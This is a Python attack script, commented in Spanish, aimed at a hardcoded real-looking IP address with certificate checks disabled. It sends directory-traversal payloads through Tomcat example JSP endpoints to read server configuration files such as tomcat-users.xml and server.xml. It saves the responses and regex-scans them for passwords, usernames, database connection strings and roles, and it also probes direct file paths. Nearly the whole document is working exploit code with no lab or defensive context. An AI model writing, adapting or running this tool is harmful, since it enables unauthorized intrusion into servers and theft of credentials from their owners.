# config_extractor.py
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ConfigExtractor:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        
    def extract_via_directory_traversal(self):
        """Extrae archivos mediante Directory Traversal"""
        print("[+] Extrayendo archivos de configuración...")
        
        # Archivos objetivo
        target_files = [
            "/conf/tomcat-users.xml",
            "/conf/server.xml", 
            "/conf/web.xml",
            "/logs/catalina.out",
            "/webapps/ROOT/WEB-INF/web.xml",
            "/webapps/SITO/WEB-INF/web.xml",
            "/webapps/manager/WEB-INF/web.xml"
        ]
        
        # Vectores de ataque conocidos para Tomcat 6
        traversal_endpoints = [
            "/examples/jsp/include/include.jsp?page=",
            "/examples/jsp/cal/cal2.jsp?time=",
            "/examples/jsp/snp/snoop.jsp?file="
        ]
        
        for endpoint in traversal_endpoints:
            print(f"\n🔍 Probando endpoint: {endpoint}")
            
            for target_file in target_files:
                payload = f"../../../../../../..{target_file}"
                url = self.base_url + endpoint + payload
                
                try:
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        # Verificar si contiene contenido válido
                        if any(keyword in response.text for keyword in ['tomcat', 'xml', 'config', 'password']):
                            print(f"  ✅ ARCHIVO ENCONTRADO: {target_file}")
                            
                            # Guardar archivo
                            filename = target_file.replace('/', '_') + '.txt'
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"    💾 Guardado como: {filename}")
                            
                            # Mostrar contenido interesante
                            self.analyze_config_content(response.text, target_file)
                            
                except Exception as e:
                    continue

    def analyze_config_content(self, content, filename):
        """Analiza el contenido de archivos de configuración"""
        print(f"    🔎 Analizando {filename}...")
        
        # Buscar patrones interesantes
        patterns = {
            'passwords': r'password[=:]["\']?([^"\'\s>]+)',
            'users': r'username[=:]["\']?([^"\'\s>]+)',
            'jdbc': r'jdbc:mysql://([^"\']+)',
            'roles': r'rolename=["\']([^"\']+)'
        }
        
        for pattern_name, pattern in patterns.items():
            import re
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"      🔍 {pattern_name}: {matches}")

    def direct_file_access(self):
        """Intenta acceso directo a archivos"""
        print("\n[+] Intentando acceso directo a archivos...")
        
        direct_paths = [
            "/../../conf/tomcat-users.xml",
            "/../conf/tomcat-users.xml", 
            "/conf/tomcat-users.xml",
            "/WEB-INF/web.xml",
            "/META-INF/context.xml"
        ]
        
        for path in direct_paths:
            url = self.base_url + path
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"  ✅ Acceso directo a: {path}")
            except:
                pass

# Ejecutar
if __name__ == "__main__":
    extractor = ConfigExtractor()
    extractor.extract_via_directory_traversal()
    extractor.direct_file_access()